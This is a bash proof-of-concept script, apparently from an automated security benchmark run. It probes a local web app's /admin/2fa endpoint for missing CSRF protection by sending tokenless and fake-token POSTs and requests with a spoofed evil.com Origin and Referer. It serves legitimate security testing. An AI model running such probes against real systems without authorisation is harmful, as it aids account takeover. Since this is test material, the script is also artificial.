#!/bin/bash
# POC: Demonstrates CSRF protection is missing on /admin/2fa endpoint. Shows that POST requests are accepted from any origin without CSRF token validation.
# Target: ./repo
# Created: 2025-12-01T15:48:21.617Z
# Session: benchmark-XBEN-089-24-minbd498

# CSRF Protection Missing on 2FA Endpoint POC
# This script demonstrates that the /admin/2fa endpoint:
# 1. Does not require CSRF tokens
# 2. Accepts POST requests with any Origin/Referer headers
# 3. Does not validate server-side CSRF protection
# 4. Does not enforce SameSite cookie restrictions

TARGET="http://localhost:5003"
ENDPOINT="${TARGET}/admin/2fa"

echo "[*] Testing CSRF Protection on /admin/2fa endpoint"
echo "[*] Target: $ENDPOINT"
echo ""

# Test 1: Get the form to check for CSRF token
echo "[TEST 1] Checking for CSRF token in HTML form..."
CSRF_CHECK=$(curl -s "$ENDPOINT" | grep -iE "csrf|token" | head -5)
if [ -z "$CSRF_CHECK" ]; then
    echo "[-] No CSRF token found in HTML form"
    TEST1_PASS=1
else
    echo "[+] CSRF token found: $CSRF_CHECK"
    TEST1_PASS=0
fi
echo ""

# Test 2: POST without CSRF token
echo "[TEST 2] Attempting POST without CSRF token..."
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
    -d "code=1234" \
    -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[!] POST accepted without CSRF token (HTTP 200)"
    echo "    Response: $BODY"
    TEST2_PASS=1
else
    echo "[+] POST rejected (HTTP $HTTP_CODE)"
    echo "    Response: $BODY"
    TEST2_PASS=0
fi
echo ""

# Test 3: POST with fake CSRF token
echo "[TEST 3] Attempting POST with fake CSRF token..."
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
    -d "code=1234&csrf_token=fake_token_12345" \
    -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[!] POST accepted with fake CSRF token (HTTP 200)"
    echo "    Response: $BODY"
    TEST3_PASS=1
else
    echo "[+] POST rejected (HTTP $HTTP_CODE)"
    echo "    Response: $BODY"
    TEST3_PASS=0
fi
echo ""

# Test 4: Cross-origin POST with Origin header
echo "[TEST 4] Attempting cross-origin POST with attacker's Origin..."
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
    -H "Origin: http://evil.com" \
    -d "code=1234" \
    -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[!] Cross-origin POST accepted (HTTP 200)"
    echo "    Response: $BODY"
    TEST4_PASS=1
else
    echo "[+] Cross-origin POST rejected (HTTP $HTTP_CODE)"
    echo "    Response: $BODY"
    TEST4_PASS=0
fi
echo ""

# Test 5: Cross-origin POST with Referer header
echo "[TEST 5] Attempting cross-origin POST with attacker's Referer..."
RESPONSE=$(curl -s -X POST "$ENDPOINT" \
    -H "Referer: http://evil.com/attack.html" \
    -d "code=1234" \
    -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[!] Cross-origin POST with different Referer accepted (HTTP 200)"
    echo "    Response: $BODY"
    TEST5_PASS=1
else
    echo "[+] Cross-origin POST rejected (HTTP $HTTP_CODE)"
    echo "    Response: $BODY"
    TEST5_PASS=0
fi
echo ""

# Summary
echo "======================================"
echo "CSRF PROTECTION TEST SUMMARY"
echo "======================================"
TOTAL_PASS=$((TEST1_PASS + TEST2_PASS + TEST3_PASS + TEST4_PASS + TEST5_PASS))
echo "Tests Passed (vulnerabilities found): $TOTAL_PASS/5"
echo ""

if [ $TOTAL_PASS -ge 3 ]; then
    echo "[CRITICAL] CSRF Protection is MISSING"
    echo "The /admin/2fa endpoint accepts POST requests without CSRF protection"
    exit 0
else
    echo "[OK] CSRF Protection appears to be in place"
    exit 1
fi